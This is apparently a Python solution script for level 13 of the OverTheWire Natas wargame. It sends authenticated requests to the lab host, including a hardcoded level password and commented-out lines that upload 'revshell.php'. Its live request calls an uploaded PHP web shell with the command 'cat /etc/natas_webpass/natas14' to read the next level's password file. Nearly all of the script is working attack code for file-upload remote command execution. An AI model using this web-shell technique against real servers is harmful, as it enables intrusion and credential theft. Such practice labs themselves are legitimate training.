import requests
import re

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = f'http://{username}.natas.labs.overthewire.org'

#files = { 'uploadedfile' : open('revshell.php', 'rb') }
#data = { 'filename' : 'revshell.php'}

#response = requests.post(url, auth = (username, password), files = files, data = data)
response = requests.get(url + '/upload/k8omshho58.php?c=cat /etc/natas_webpass/natas14', auth = (username, password))
content = response.text

print(re.findall('\n(.*)\n', content)[0])